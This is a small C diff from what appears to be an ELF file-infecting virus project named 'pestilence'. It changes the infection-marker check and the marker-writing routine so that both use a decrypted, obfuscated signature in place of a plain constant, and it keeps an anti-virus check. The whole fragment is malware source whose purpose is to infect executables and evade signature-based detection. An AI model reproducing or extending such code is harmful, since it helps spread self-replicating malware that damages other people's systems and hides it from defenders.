@@ -22,7 +22,8 @@ void    ft_pointer_strings_table(t_pestilence *pestilence)
 
 int ft_detect_prev_infection(t_pestilence *pestilence)
 {
-    pestilence->signd = memmem(pestilence->elf, pestilence->file_size, SIGNATURE, strlen(SIGNATURE));
+    ft_obfuscation(pestilence);
+    pestilence->signd = memmem(pestilence->elf, pestilence->file_size, pestilence->decrypted, strlen(pestilence->decrypted));
     if (pestilence->signd || pestilence->anti_virus == 1)
         return (0);
     else
@@ -37,6 +38,6 @@ void    ft_infect(t_pestilence *pestilence)
     if (pestilence->fd == -1)
         return;
     lseek(pestilence->fd, 0, SEEK_END);
-    write(pestilence->fd, SIGNATURE, strlen(SIGNATURE));
+    write(pestilence->fd, pestilence->decrypted, strlen(pestilence->decrypted));
     close(pestilence->fd);
 }
